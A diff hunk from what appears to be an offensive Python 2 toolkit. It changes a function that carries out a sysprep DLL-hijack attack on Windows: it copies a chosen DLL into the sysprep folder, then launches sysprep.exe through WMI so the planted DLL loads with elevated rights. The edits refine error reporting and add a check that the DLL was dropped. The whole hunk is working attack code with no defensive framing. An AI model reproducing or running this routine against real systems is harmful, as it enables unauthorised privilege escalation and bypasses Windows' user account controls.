@@ -43,24 +43,24 @@ def sysprep_dll_hijack():
 			shutil.copy(dll_name,dll_drop)
 			print " {} sysprep_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
 		except shutil.Error as error:
-			print " {} sysprep_dll_hijack: Unable to copy: {} - {}".format(errorBox(),dll_name,error)
+			print " {} sysprep_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
 			return False
 		except IOError as error:
-			print " {} sysprep_dll_hijack: Unable to copy: {} - {}".format(errorBox(),dll_name,error)
+			print " {} sysprep_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
 			return False
 
-		print " {} sysprep_dll_hijack: Attempting to create process".format(infoBox())
-		try:
-			result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"sysprep.exe")),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
-			if (result[1] == 0):
-				print " {} sysprep_dll_hijack: Process started successfully".format(successBox())
-			else:
-				print " {} sysprep_dll_hijack: Problem creating process".format(errorBox())
-				return False
-		except Exception as error:
-			print " {} sysprep_dll_hijack: Problem creating process".format(errorBox())
-			return False			
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
+			print " {} sysprep_dll_hijack: Attempting to create process".format(infoBox())
+			try:
+				result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"sysprep.exe")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+				if (result[1] == 0):
+					print " {} sysprep_dll_hijack: Process started successfully".format(successBox())
+				else:
+					print " {} sysprep_dll_hijack: Problem creating process".format(errorBox())
+			except Exception as error:
+				print " {} sysprep_dll_hijack: Problem creating process: {}".format(errorBox(),error)
+				return False			
 			
 	else:
 		print " {} sysprep_dll_hijack: We are not admin, cannot proceed".format(errorBox())
